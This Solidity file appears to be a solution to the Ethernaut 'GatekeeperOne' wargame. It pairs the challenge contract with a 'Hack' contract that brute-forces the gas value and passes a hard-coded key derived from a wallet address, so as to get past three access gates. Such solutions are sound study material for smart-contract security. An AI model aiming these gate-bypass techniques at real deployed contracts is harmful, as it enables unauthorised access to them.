// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
  modifier gateTwo() 
  {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
contract Hack
{
    GatekeeperOne i;
    uint public loop;
    constructor(address payable j)
    {
        i = GatekeeperOne(j);
    }

    function attack() public returns (bool)
    {
        for(uint k=1;k <= 8191;k++)
        {
            // try and catch only work for external calls and contract creation.
            try i.enter{gas: 8191*10 + k}(0x000a000000008d4B)
            {
                loop = k;
                return true;
            }
            catch
            {

            }
        }
        return false;
    }   
}
//0x8DAB96e9241b68A488948c1421e4776D333b8d4B  // 40 hexadecimal
